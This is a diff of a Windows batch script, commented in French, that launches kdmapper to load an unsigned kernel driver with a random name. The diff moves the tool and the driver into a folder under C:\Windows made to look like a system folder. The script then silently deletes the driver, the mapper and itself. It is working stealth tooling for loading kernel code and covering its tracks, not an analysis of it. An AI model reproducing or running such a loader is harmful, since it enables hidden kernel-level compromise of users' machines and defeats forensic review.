@@ -10,12 +10,12 @@ if %errorlevel% NEQ 0 (
 )
 
 :: Lancement de kdmapper
-start "" "%TEMP%\kdmapper_release.exe" "%TEMP%\WindowedZXUV.sys" >nul 2>&1
+start "" "C:\Windows\SKB\LanguageModels\kdmapper_release.exe" "C:\Windows\SKB\LanguageModels\1drzoj.sys" >nul 2>&1
 
 :: Attente pour que kdmapper termine
 timeout /t 6 /nobreak >nul
 
 :: Nettoyage + auto-suppression
-start "" /b cmd /c "timeout /t 3 /nobreak >nul & del /F /Q "%TEMP%\WindowedZXUV.sys" "%TEMP%\kdmapper_release.exe" "%TEMP%\kdmapper_release.exe" "%~f0" >nul 2>&1" >nul 2>&1
+start "" /b cmd /c "timeout /t 3 /nobreak >nul & del /F /Q "C:\Windows\SKB\LanguageModels\1drzoj.sys" "C:\Windows\SKB\LanguageModels\kdmapper_release.exe" "C:\Windows\SKB\LanguageModels\kdmapper_release.exe" "%~f0" >nul 2>&1" >nul 2>&1
 
 exit
